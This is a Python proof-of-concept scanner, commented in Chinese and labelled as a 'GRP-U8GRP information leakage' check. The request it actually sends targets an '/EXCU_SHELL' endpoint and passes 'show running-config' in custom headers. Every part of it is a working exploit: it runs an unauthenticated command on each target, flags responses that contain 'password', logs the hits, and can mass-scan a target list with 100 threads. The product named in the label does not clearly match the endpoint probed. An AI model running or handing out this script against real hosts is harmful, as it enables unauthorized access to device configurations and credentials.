import requests
import argparse
import sys
from multiprocessing.dummy import Pool

# 忽略警告
requests.packages.urllib3.disable_warnings()

# 定义一个打印banner的函数
def banner():
    test = """
███████╗██╗  ██╗██╗   ██╗██╗   ██╗
██╔════╝██║ ██╔╝╚██╗ ██╔╝██║   ██║
███████╗█████╔╝  ╚████╔╝ ██║   ██║
╚════██║██╔═██╗   ╚██╔╝  ██║   ██║
███████║██║  ██╗   ██║   ╚██████╔╝
╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝                                                                                
"""
    print(test)

# 主函数
def main():
    banner()  # 打印banner
    parser = argparse.ArgumentParser(description='GRP-U8GRP information leakage! ')  # 创建解析器对象
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')  # 添加命令行参数选项
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')  # 添加命令行参数选项
    args = parser.parse_args()  # 解析命令行参数

    # 判断输入的参数是单个链接还是文件路径
    if args.url and not args.file:
        poc(args.url)  # 调用poc函数处理单个链接
    elif not args.url and args.file:
        url_list = []  # 存储链接的列表
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))  # 读取文件中的链接并添加到列表中
        # 多线程处理链接
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")  # 打印提示信息

# 漏洞检测函数
def poc(target):
    url = target + '/EXCU_SHELL'  # 构造POC的URL
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2852.74 Safari/537.36',
                'Accept-Encoding':'gzip, deflate',
                'Accept':'/',
                'Connection':'close',
                'Cmdnum':'"1"',
                'Command1':'show running-config',
                'Confirm1':'n'
               }  # 设置请求头
    try:
        res = requests.get(url=url, headers=headers, allow_redirects=True, timeout=10, verify=False)
        if res.status_code == 200 and "password" in res.text:
            print(f"[+]该url存在漏洞：{target}")
            with open("result.txt", "a", encoding="utf-8") as f:
                    f.write(target + "\n")
        else:
            print(f"[-]该url不存在漏洞：{target}")
    except Exception as e:
        print(f"[*]发生异常：{e}")

if __name__ == '__main__':
    main()  # 调用主函数
